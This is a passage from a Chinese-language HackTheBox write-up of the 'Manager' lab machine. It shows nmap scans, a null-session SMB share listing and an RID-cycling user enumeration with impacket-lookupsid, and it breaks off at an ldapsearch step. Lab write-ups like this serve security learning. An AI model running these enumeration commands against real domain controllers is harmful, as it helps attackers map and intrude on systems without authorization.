---
title: HackTheBox Manager [RID cycling + MSSQL xp_dirtree + ESC7 exploitation]
url: https://fdlucifer.github.io/2024/03/17/htb-manager/
source: fdvoid0's blog
date: 2024-03-18
fetch_date: 2025-10-04T12:08:13.601536
---

# HackTheBox Manager [RID cycling + MSSQL xp_dirtree + ESC7 exploitation]

[0xfd's blog](/)

by 0xfd

* [Home](/)
* [About](/about/)
* [Tags41](/tags/)
* [Categories78](/categories/)
* [Archives214](/archives/)
* [Commonweal 404](/404/)
* Search

* Table of Contents
* Overview

1. [1. 简述](#%E7%AE%80%E8%BF%B0)
2. [2. 信息收集](#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86)
3. [3. getshell](#getshell)
   1. [3.1. LDAP](#LDAP)
   2. [3.2. MSSQL](#MSSQL)
4. [4. 提权](#%E6%8F%90%E6%9D%83)
5. [5. Reference Sources](#Reference-Sources)

![253](/images/blackhole.png)

253

All things about infosec & ctf

[214
posts](/archives/)

[78
categories](/categories/)

[41
tags](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

Links

* atsud0
* 记忆里的纯真
* 小离

# HackTheBox Manager [RID cycling + MSSQL xp\_dirtree + ESC7 exploitation]

Posted on
2024-03-17

In

[RID cycling](/categories/RID-cycling/)
,
[MSSQL xp\_dirtree](/categories/RID-cycling/MSSQL-xp-dirtree/)
,
[ESC7 exploitation](/categories/RID-cycling/MSSQL-xp-dirtree/ESC7-exploitation/)

Views:

Word count in article:
3.4k

Reading time ≈
12 mins.

# 简述

本文是Medium难度的HTB Manager机器的域渗透部分，其中RID cycling, MSSQL xp\_dirtree, ESC7 exploitation等域渗透提权细节是此box的特色，主要参考0xdf’s blog manager walkthrough和HTB的manager官方writeup paper记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/manager.png)

# 信息收集

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 ``` | ``` {} manager nmap -p- --min-rate 10000 10.10.11.236 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 08:06 CDT Nmap scan report for manager.htb (10.10.11.236) Host is up (0.27s latency). Not shown: 65513 filtered tcp ports (no-response) PORT      STATE SERVICE 53/tcp    open  domain 80/tcp    open  http 88/tcp    open  kerberos-sec 135/tcp   open  msrpc 139/tcp   open  netbios-ssn 389/tcp   open  ldap 445/tcp   open  microsoft-ds 464/tcp   open  kpasswd5 593/tcp   open  http-rpc-epmap 636/tcp   open  ldapssl 1433/tcp  open  ms-sql-s 3268/tcp  open  globalcatLDAP 3269/tcp  open  globalcatLDAPssl 5985/tcp  open  wsman 9389/tcp  open  adws 49667/tcp open  unknown 49669/tcp open  unknown 49670/tcp open  unknown 49671/tcp open  unknown 49727/tcp open  unknown 51977/tcp open  unknown 52689/tcp open  unknown  root@kali ~/hackthebox/machine/manager ☺  nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389 -sCV 10.10.11.236                                               system: ruby 3.1.2p20 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 08:06 CDT Nmap scan report for manager.htb (10.10.11.236) Host is up (0.30s latency).  PORT     STATE SERVICE       VERSION 53/tcp   open  domain        Simple DNS Plus 80/tcp   open  http          Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_  Potentially risky methods: TRACE |_http-title: Manager 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-17 13:07:04Z) 135/tcp  open  msrpc         Microsoft Windows RPC 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-03-17T13:08:39+00:00; +33s from scanner time. | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after:  2024-07-29T13:51:28 445/tcp  open  microsoft-ds? 464/tcp  open  kpasswd5? 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-03-17T13:08:39+00:00; +35s from scanner time. | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after:  2024-07-29T13:51:28 1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-ntlm-info: |   10.10.11.236:1433: |     Target_Name: MANAGER |     NetBIOS_Domain_Name: MANAGER |     NetBIOS_Computer_Name: DC01 |     DNS_Domain_Name: manager.htb |     DNS_Computer_Name: dc01.manager.htb |     DNS_Tree_Name: manager.htb |_    Product_Version: 10.0.17763 |_ssl-date: 2024-03-17T13:08:39+00:00; +34s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2024-03-17T11:45:12 |_Not valid after:  2054-03-17T11:45:12 | ms-sql-info: |   10.10.11.236:1433: |     Version: |       name: Microsoft SQL Server 2019 RTM |       number: 15.00.2000.00 |       Product: Microsoft SQL Server 2019 |       Service pack level: RTM |       Post-SP patches applied: false |_    TCP port: 1433 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-03-17T13:08:39+00:00; +34s from scanner time. | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after:  2024-07-29T13:51:28 3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after:  2024-07-29T13:51:28 |_ssl-date: 2024-03-17T13:08:39+00:00; +35s from scanner time. 5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open  mc-nmf        .NET Message Framing Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: |_clock-skew: mean: 32s, deviation: 1s, median: 33s | smb2-security-mode: |   3:1:1: |_    Message signing enabled and required | smb2-time: |   date: 2024-03-17T13:07:57 |_  start_date: N/A  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 103.17 seconds ``` |

了解到该box是一台域控,且开放了1433 mssql数据库

现在继续枚举SMB服务。利用smbclient工具通过使用空会话列出所有共享，因为刚开始没有任何密码。

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 ``` | ``` {} manager smbclient -L \\\\10.10.11.236\\ -N          Sharename       Type      Comment         ---------       ----      -------         ADMIN$          Disk      Remote Admin         C$              Disk      Default share         IPC$            IPC       Remote IPC         NETLOGON        Disk      Logon server share         SYSVOL          Disk      Logon server share Reconnecting with SMB1 for workgroup listing. ``` |

通常，当允许列出具有空会话的共享时，还可以利用它来执行RID循环并枚举机器上的用户。

***RID循环是一种方法，当允许列出具有空会话的共享时，用于枚举Windows系统上的用户。它涉及到通过增加相对标识符(RID)部分来顺序查询安全标识符(sid)。由于rid是按顺序分配给Windows中的用户和组的，因此该技术可以显示有效的用户帐户。
通过将RID循环与共享列表的空会话访问相结合，攻击者可以收集有关系统上现有用户的信息，从而帮助进一步的利用工作。***

可以使用Impacket库的lookupsid模块来执行RID循环以枚举盒子上的用户。

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 ``` | ``` {} manager impacket-lookupsid anonymous@manager.htb -no-pass | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tr '[:upper:]' '[:lower:]' | tee users administrator guest krbtgt dc01$ zhong cheng ryan raven jinwoo chinhae operator ``` |

* 使用ldapsearch来确认基本域名:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 ``` | ``` {} manager ldapsearc...